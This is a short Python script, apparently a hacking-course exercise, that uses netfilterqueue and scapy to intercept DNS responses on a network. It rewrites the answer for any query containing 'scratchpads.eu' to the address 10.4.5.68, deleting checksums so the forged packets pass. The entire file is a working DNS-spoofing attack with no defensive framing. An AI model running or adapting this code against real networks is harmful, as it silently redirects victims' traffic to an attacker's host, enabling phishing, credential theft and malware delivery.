#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):

    scapy_pack = scapy.IP(packet.get_payload())
    if scapy_pack.haslayer(scapy.DNSRR):
        qname = scapy_pack[scapy.DNSQR].qname
        #print(scapy_pack.show())
        if "scratchpads.eu" in qname:
            print("[+] Spoofing address :")
            answer = scapy.DNSRR(rrname=qname, rdata="10.4.5.68")
            #applyt the modification into the packet answer
            scapy_pack[scapy.DNS].an = answer
            #change answer responce number to 1 (replace 4...)
            scapy_pack[scapy.DNS].ancount = 1
            # Delete checksum and len to avoid corruption
            del scapy_pack[scapy.IP].len
            del scapy_pack[scapy.IP].chksum
            del scapy_pack[scapy.UDP].len
            del scapy_pack[scapy.UDP].chksum

            packet.set_payload(str(scapy_pack))
            #packet.payload = scapy_pack.payload

        #print(ip)
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
